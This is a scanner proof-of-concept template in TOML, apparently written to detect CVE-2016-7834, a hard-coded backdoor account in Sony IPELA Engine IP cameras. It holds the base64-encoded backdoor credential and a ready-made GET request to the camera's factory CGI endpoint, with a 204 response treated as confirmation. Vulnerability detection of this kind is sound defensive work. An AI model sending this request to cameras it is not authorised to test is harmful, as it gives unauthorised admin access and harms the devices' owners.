[info]
author = "ave"
description = "通过硬编码的Bearer令牌访问/command/prima-factory.cgi接口，若响应状态码为204，则确认设备存在硬编码后门账户，攻击者可利用该漏洞获取管理员权限。"
id = "POC-AVE-2016-0071"
name = "SONY IPELA Engine IP Camera 硬编码账户信息泄露 PoC"
severity = "high"
tags = ["ave-2016-0071"]
vuln_id = [
    "CVE-2016-7834",
    "AVE-2016-0071",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/command/prima-factory.cgi"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
Authorization = "Bearer cHJpbWFuYTpwcmltYW5h"

[[poc.requests.matchers]]
expect = true
status = [204]
type = "status"
